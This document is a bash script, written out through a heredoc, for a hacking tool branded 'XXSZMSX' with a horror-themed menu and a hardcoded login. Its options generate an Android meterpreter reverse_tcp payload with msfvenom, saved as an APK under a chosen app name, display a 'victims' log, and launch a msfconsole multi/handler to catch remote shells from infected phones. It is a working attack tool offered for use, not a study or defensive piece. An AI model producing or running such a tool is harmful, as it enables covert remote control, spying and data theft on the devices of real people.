cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX (BLOOD-S EDITION)
# STYLE: RED HORROR / BIG LETTERS / MOBILE COMPACT
# =====================================================

# ألوان الدم (Bold Deep Red)
BRED='\e[1;31;1m'
RED='\e[1;31m'
NC='\e[0m'

# مسار الحفظ التلقائي
[[ -d "/data/data/com.termux/files/usr/bin" ]] && SAVE_DIR="/sdcard" || SAVE_DIR="$HOME/Desktop"

# --- [ واجهة الدخول ] ---
clear
echo -e "${BRED}┌────────────────────────────────────────┐"
echo -e "│       XXSZMSX : BLOOD ACCESS           │"
echo -e "└────────────────────────────────────────┘${NC}"
echo -ne "${RED}[†] Identity: ${NC}"; read username
echo -ne "${RED}[†] Key: ${NC}"; read -s password

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${BRED}[!] ALERT: ACCESS DENIED!${NC}"; exit 1
fi

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${BRED}"
    # اسم الأداة كامل (XXSZMSX) - الحروف مرسومة بخانات ضخمة وواضحة جداً
    echo "  ██╗  ██╗██╗  ██╗ ██████╗ ███████╗"
    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝ ╚══███╔╝"
    echo "   ╚███╔╝  ╚███╔╝ ███████╗   ███╔╝ "
    echo "   ██╔██╗  ██╔██╗ ╚════██╗  ███╔╝  "
    echo "  ██╔╝ ██╗██╔╝ ██╗███████║ ███████╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚══════╝"
    echo "   ███╗   ███╗ ███████╗ ██╗  ██╗   "
    echo "   ████╗ ████║ ██╔════╝ ╚██╗██╔╝   "
    echo "   ██╔████╔██║ ███████╗  ╚███╔╝    "
    echo "   ██║╚██╔╝██║ ╚════██║  ██╔██╗    "
    echo "   ██║ ╚═╝ ██║ ███████║ ██╔╝ ██╗   "
    echo "   ╚═╝     ╚═╝ ╚══════╝ ╚═╝  ╚═╝   "
    echo "      [ X X S Z M S X  V60.0 ]"
    echo "  ------------------------------------"
    echo -e "  [ SYSTEM: $SAVE_DIR ]"
    echo -e "  ------------------------------------${NC}"
    
    echo -e "${RED}  [1]${NC} Build Infected APK"
    echo -e "${RED}  [2]${NC} Victims Blood-Logs"
    echo -e "${RED}  [3]${NC} Master Controller"
    echo -e "${RED}  [0]${NC} Shutdown System"
    echo -e "${BRED}  ------------------------------------${NC}"
    echo -ne "${BRED}  XXSZMSX >> ${NC}"
    read choice

    case $choice in
        1) 
           clear
           echo -e "${BRED}--- [ INFECTION MODE ] ---${NC}"
           read -p "[+] App Name: " app_name
           read -p "[+] Icon URL: " icon_url
           read -p "[+] LHOST IP: " lh
           read -p "[+] LPORT: " lp
           echo -e "${RED}[*] Injecting blood into $app_name.apk...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
           echo -e "${BRED}[+] SUCCESS: INFECTED FILE SAVED!${NC}"
           read -p "Press Enter to return..." ;;
        2)
           clear
           echo -e "${BRED}--- [ VICTIMS BLOOD-LOG ] ---${NC}"
           [ -f ".victims_log.txt" ] && cat ".victims_log.txt" || echo -e "${RED}Empty.${NC}"
           read -p "Press Enter to return..." ;;
        3) 
           clear
           echo -e "${RED}[*] Opening Tunnel to Darkness...${NC}"
           msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; exploit -j" ;;
        0) exit 0 ;;
    esac
done
EOF
